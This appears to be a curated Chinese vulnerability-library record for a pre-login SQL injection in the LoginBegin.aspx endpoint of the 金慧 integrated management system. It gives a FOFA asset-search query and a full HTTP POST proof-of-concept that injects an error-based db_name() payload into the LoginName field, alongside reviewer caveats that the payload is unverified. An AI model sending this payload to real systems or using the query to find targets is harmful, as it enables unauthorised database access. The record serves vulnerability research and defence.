---
source: "wy876 漏洞文库"
title: "金慧综合管理信息系统 LoginBegin LoginName SQL 注入"
product: "金慧综合管理信息系统"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "SQL Server db_name转换报错；版本未知"
prerequisites: "登录前请求"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/ccmkokynsqfrhghm"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E9%87%91%E6%85%A7/%E9%87%91%E6%85%A7%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9FLoginBegin%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa: "app=\"金慧-综合管理信息系统\""
id: "vw-87607a3114ccae95f9571ab3"
entity_id: "ve-87607a3114ccae95f9571ab3"
schema_version: "1"
---

# 金慧综合管理信息系统 LoginBegin LoginName SQL 注入

## 条目说明

- 对象与具体问题：金慧综合管理信息系统；LoginBegin LoginName SQLi
- 版本、配置及部署条件：SQL Server db_name转换报错；版本未知
- 认证与权限前提：登录前请求
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 用户名拼接报错样例但无返回/根因/修复证据
- Host为空，大小写SQL应规范，不能从载荷认定已获取数据库权限
- 产品目录合理但版本只产品名

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
金慧综合管理信息系统LoginBegin存在sql注入漏洞

## 二、影响版本
+ 金慧综合管理信息系统

## 三、资产测绘
+ fofa`app="金慧-综合管理信息系统"`
+ 特征


## 四、漏洞复现
```http
POST /Portal/LoginBegin.aspx HTTP/1.1
Upgrade-Insecure-Requests: 1
Connection: close
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20100101 Chrome/23.0.1271.64 Safari/537.11
Accept: application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*
Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3
Content-Type: application/x-www-form-urlencoded
Host: 

Todo=Validate&LoginName=beczou'or (select db_name())>0--&Password=admin&CDomain=Local&FromUrl=admin
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ccmkokynsqfrhghm>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
